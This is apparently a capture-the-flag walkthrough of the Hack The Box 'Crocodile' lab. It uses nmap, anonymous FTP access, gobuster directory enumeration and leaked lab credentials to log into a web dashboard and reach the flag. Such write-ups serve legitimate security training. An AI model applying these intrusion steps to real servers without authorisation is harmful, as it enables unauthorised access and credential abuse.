This box is about "FTP".

### Scan
```shell
┌──(kali㉿kali)-[~/htb]
└─$ nmap -sC -sV 10.129.89.19  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-31 16:15 EDT
Nmap scan report for 10.129.89.19
Host is up (0.017s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.233
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Smash - Bootstrap Business Template
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Unix
```

### Enumerate FTP

> The File Transfer Protocol (FTP) is a standard communication protocol used to transfer
computer files from a server to a client on a computer network. FTP users may
authenticate themselves with a clear-text sign-in protocol, generally using a username
and password. However, they can connect anonymously if the server is configured to
allow it.

Users can connect to the FTP server using "anonymous" account without password. Notice ```ftp-anon: Anonymous FTP login allowed (FTP code 230)```.

```shell
┌──(kali㉿kali)-[~/htb]
└─$ ftp 10.129.89.19
Connected to 10.129.89.19.
220 (vsFTPd 3.0.3)
Name (10.129.89.19:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||40679|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
226 Directory send OK.
ftp> get allowed.userlist
local: allowed.userlist remote: allowed.userlist
229 Entering Extended Passive Mode (|||48500|)
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
100% |***********************************************************************|    33       36.12 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (1.78 KiB/s)
ftp> get a
allowed.userlist        allowed.userlist.passwd
ftp> get allowed.userlist.passwd
local: allowed.userlist.passwd remote: allowed.userlist.passwd
229 Entering Extended Passive Mode (|||46198|)
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
100% |***********************************************************************|    62      992.57 KiB/s    00:00 ETA
226 Transfer complete.
62 bytes received in 00:00 (3.46 KiB/s)

┌──(kali㉿kali)-[~/htb]
└─$ cat allowed.userlist
aron
pwnmeow
egotisticalsw
admin
                                                                                                                    
┌──(kali㉿kali)-[~/htb]
└─$ cat allowed.userlist.passwd   
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

### Enumerate Web App

Btw, **Wappalyzer** is a really good plug-in for browser. We can learn about the tech used on that website.

Base on that, we could even update our command below with ```-x php, html```.

```shell
┌──(kali㉿kali)-[~/htb]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.129.89.19
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.89.19
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/31 16:26:19 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 313] [--> http://10.129.89.19/assets/]
/css                  (Status: 301) [Size: 310] [--> http://10.129.89.19/css/]   
/js                   (Status: 301) [Size: 309] [--> http://10.129.89.19/js/]    
/fonts                (Status: 301) [Size: 312] [--> http://10.129.89.19/fonts/] 
/dashboard            (Status: 301) [Size: 316] [--> http://10.129.89.19/dashboard/]
```

Go to /dashboard, it redirects to login page.

![login page](/img/htb/crocodile-login.png)

login with ```admin:rKXM59ESxesUFHAd```

![flag page](/img/htb/crocodile-flag.png)
